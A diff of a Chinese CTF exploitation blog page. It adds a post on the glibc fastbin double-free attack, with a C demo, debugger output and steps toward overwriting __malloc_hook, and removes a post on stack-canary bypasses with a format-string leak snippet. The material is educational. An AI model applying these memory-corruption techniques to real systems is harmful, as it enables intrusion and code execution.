@@ -156,6 +156,140 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/" class="post-title-link" itemprop="url">Ptmalloc算法：Double Free</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-22 22:53:59" itemprop="dateCreated datePublished" datetime="2022-01-22T22:53:59+08:00">2022-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-01 19:45:51" itemprop="dateModified" datetime="2022-03-01T19:45:51+08:00">2022-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Ptmalloc算法：Double-Free"><a href="#Ptmalloc算法：Double-Free" class="headerlink" title="Ptmalloc算法：Double Free"></a>Ptmalloc算法：Double Free</h2><p>Double Free是 <code>Fastbin Attack</code> 中的一种</p>
+<p>本质上就是对一个chunk进行两次free，从而实现 <strong>多个指针指向同一个堆块</strong> 的操作 </p>
+<hr>
+<h2 id="Free验证机制"><a href="#Free验证机制" class="headerlink" title="Free验证机制"></a>Free验证机制</h2><p>通常来说，同一个chunk是不能被free两次的</p>
+<p>例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(): double free detected <span class="keyword">in</span> tcache <span class="number">2</span></span><br><span class="line">[<span class="number">1</span>]    <span class="number">3376</span> abort (core dumped)  ./test</span><br></pre></td></tr></table></figure>
+<p>这是因为有以下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>检查 fastbin 头部指向的 chunk 和被 “free” 的 chunk 是否相等，其后就没有检查了</p>
+<h2 id="伪造案例"><a href="#伪造案例" class="headerlink" title="伪造案例"></a>伪造案例</h2><p>如果这样构造payload，就会形成异常的fastbin：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b,*chunk_c,*chunk_s;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_c=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,chunk_a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,chunk_b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,chunk_c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当所有的free执行完成后：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x55555555b000</span> —▸ <span class="number">0x55555555b020</span> ◂— <span class="number">0x55555555b000</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>fastbin出现异常，接下来继续单步，看看程序会怎么分配chunk：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk_a = <span class="number">0x55555555b010</span></span><br><span class="line">chunk_b = <span class="number">0x55555555b030</span></span><br><span class="line">chunk_c = <span class="number">0x55555555b010</span></span><br></pre></td></tr></table></figure>
+<p>“chunk_a”和“chunk_c”被分配到了同一个地方，这就是Double Free的核心</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642661329481-1646135147025.png" class width="1642661329481"> 
+<p>Double Free 和 UAF 很像，都是程序没有置空指针而产生的漏洞</p>
+<p>利用的关键都是看程序的“free模块”，看下哪些指针没有被置空</p>
+<h2 id="Double-Free利用姿势"><a href="#Double-Free利用姿势" class="headerlink" title="Double Free利用姿势"></a>Double Free利用姿势</h2><p>利用条件：</p>
+<ul>
+<li>“free模块”没有置空指针</li>
+</ul>
+<p>利用效果：</p>
+<ul>
+<li>WAA</li>
+</ul>
+<p>利用姿势：</p>
+<p>一，申请两个chunk，并依次释放chunk1，chunk2：（chunk2 -&gt; chunk1）</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642847247826-1646135147026.png" class width="1642847247826"> 
+<p>二，再次释放chunk1：（chunk1 -&gt; chunk2 -&gt; chunk1）</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642847626446-1646135147036.png" class width="1642847626446"> 
+<p>三，申请chunk：（New chunk1）</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642847348320-1646135147036.png" class width="1642847348320"> 
+<p>四，修改New chunk1，把FD指针的位置改为“ Malloc_hook - 0x10 ”：</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642848070328-1646135147036.png" class width="1642848070328"> 
+<p>五，申请chunk：（New chunk2）</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642848529478-1646135147036.png" class width="1642848529478"> 
+<p>六，申请chunk：（New chunk3 和 New chunk1重合）</p>
+<img src="/2022/01/22/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ADouble%20Free/1642848605831-1646135147036.png" class width="1642848605831"> 
+<p>七，再次申请chunk，并进行修改（程序把“Malloc_hook”误以为是chunk）</p>
+<p>原理总述：</p>
+<p>利用Double Free的特性（可以申请到相同的chunk），先在某个chunk的FD指针中写入 “目标地址 - 0x10” ，程序会误以为它是某个chunk，于是会把这片区域当成chunk给申请出来，最后就可以直接修改了</p>
+<p>​        // 虽然New chunk1是“allocate chunk”，但是通过Double Free把它存储在了fastbin中，所以它也会被当做是“free chunk”</p>
+<p><strong>PS：</strong></p>
+<p>因为在 fastbin 中，malloc 会检查 fast chunk 的 size 位是否合适才分配 chunk</p>
+<p>这导致了 Double free 的利用需要一些特殊手段（利用现成地址分割“size”）</p>
+<p>而在 cachebin 中没有对应的检查（至少2.27没有），所以 Double free 满天飞</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/exit_hook+dlopen%E5%8A%AB%E6%8C%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1604,146 +1738,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/04/pwn%E7%A9%BFcanary/" class="post-title-link" itemprop="url">pwn穿canary</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-01-04 22:35:10" itemprop="dateCreated datePublished" datetime="2022-01-04T22:35:10+08:00">2022-01-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-16 18:48:35" itemprop="dateModified" datetime="2022-03-16T18:48:35+08:00">2022-03-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>6.3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>6 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="canary的各种绕过技巧"><a href="#canary的各种绕过技巧" class="headerlink" title="canary的各种绕过技巧"></a>canary的各种绕过技巧</h2><p>前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了</p>
-<p>回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧</p>
-<hr>
-<h2 id="canary原理"><a href="#canary原理" class="headerlink" title="canary原理"></a>canary原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>
-<p>有时候我们会在IDA中看见这两个东西，这就是canary的生成代码</p>
-<p>在函数开始，fs:0x28 的值被存储在 ebp - 0xc，在函数返回之前对 ebp - 0xc处的值进行检查，如果和 fs:0x28 不一样，说明发生了溢出，紧接着执行__stack_chk_fail_local 并退出进程 </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007F</span>3                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004007F</span>C                 mov     [rsp+<span class="number">128</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000400804</span>                 <span class="keyword">xor</span>     eax, eax</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400882</span>                 mov     rax, [rsp+<span class="number">128</span>h+var_20]</span><br><span class="line">.text:<span class="number">000000000040088</span>A                 <span class="keyword">xor</span>     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000400893</span>                 jnz     <span class="keyword">short</span> loc_4008A9</span><br><span class="line">    --------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004008</span>A9 loc_4008A9:         </span><br><span class="line">.text:<span class="number">00000000004008</span>A9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
-<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png" class width="1641023789366"> 
-<p>​        //这个图的上面是高地址，下面是低地址</p>
-<p>那么，fs:0x28 中的值是怎么生成的呢？</p>
-<p>事实上，TLS 中的值由函数 security_init 进行初始化 </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
-<p><strong>在gcc中使用canary：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>这个可以说是经典了，找一找偏移用“%p”一下子就搞出来了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa\n&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf28</span> --&gt; <span class="number">0xa</span> (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="number">10016</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10024</span>| <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10032</span>| <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdf48</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdf50</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10056</span>| <span class="number">0x7fffffffdf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10064</span>| <span class="number">0x7fffffffdf60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10072</span>| <span class="number">0x7fffffffdf68</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10080</span>| <span class="number">0x7fffffffdf70</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10088</span>| <span class="number">0x7fffffffdf78</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10096</span>| <span class="number">0x7fffffffdf80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10104</span>| <span class="number">0x7fffffffdf88</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10112</span>| <span class="number">0x7fffffffdf90</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10120</span>| <span class="number">0x7fffffffdf98</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10128</span>| <span class="number">0x7fffffffdfa0</span> --&gt; <span class="number">0x400a50</span> (push   r15)</span><br><span class="line"><span class="number">10136</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d00</span>            <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10144</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10152</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10160</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
-<p>可以计算出偏移为“17”</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formats(<span class="string">&quot;%23$p&quot;</span>)     <span class="comment">#这是64位系统 17+6=23</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)    <span class="comment">#用prinft打印的canary以‘0x’开头</span></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+p.recv(<span class="number">16</span>))		<span class="comment">#canary有8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
-<p>​        //通常把gdb和终端结合起来看效果更好</p>
-<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><p>canary设计为以字节“\x00”结尾，而输出函数会被“\x00”中断，如果把“\x00”给覆盖了就可以利用输出函数来泄露canary</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10018</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10020</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10028</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10030</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10038</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d</span>+<span class="string">&#x27;\n&#x27;</span>         <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10050</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
-<p>这样canary结尾的“\x00”就被替换为了“\n”，后续的read函数就可以成功泄露canary</p>
-<h2 id="利用stack-chk-fail的报错信息"><a href="#利用stack-chk-fail的报错信息" class="headerlink" title="利用stack_chk_fail的报错信息"></a>利用stack_chk_fail的报错信息</h2><p>前面两个都是常规的，这个就不一样了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">3005</span> abort (core dumped)  ./newbie</span><br></pre></td></tr></table></figure>
-<p>当canary被覆盖时，程序会进行上述报错</p>
-<p>打印这些字符串的函数是“stack_chk_fail.c”：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;debug/fortify_fail.c&quot;</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *msg;</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line"> msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
-<p>可以发现canary触发时会打印 “libc_argv[0]”，如果栈溢出覆盖了 “libc_argv[0]”，那么程序就会打印覆盖的内容</p>
-<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png" class width="1641027667797">  
-<p>​        // libc_argv[0]装有<strong>指向程序地址</strong>的指针</p>
-<p>这种操作只能泄露指针的内容，并且需要目标指针的地址来覆盖 “libc_argv[0]” ，所以“libc_argv[0]” 相当于输入值的偏移也需要掌握</p>
-<p>​        // 如果存在“fork”，还可以利用这种方式来打印“libc_base”</p>
-<h2 id="stack-chk-fail劫持"><a href="#stack-chk-fail劫持" class="headerlink" title="stack_chk_fail劫持"></a>stack_chk_fail劫持</h2><p>canary报错时会调用 <strong>_stack_chk_fail</strong> ，那么劫持 <strong>_stack_chk_fail</strong> 当然也是一种攻击手段</p>
-<p>这个一般通过GOT表劫持该函数，所以不能开启 <strong>Full RELRO</strong> 保护</p>
-<p>像printf格式化漏洞WAA，或者堆溢出WAA，都可以改写GOT表内容，甚至配合UAF和数组越位也可以改写GOT表（如果合适的话）</p>
-<h2 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one-by-one爆破"></a>one-by-one爆破</h2><p>一般来说，爆破canary是很蠢的事情，因为每次运行程序canary都会改变</p>
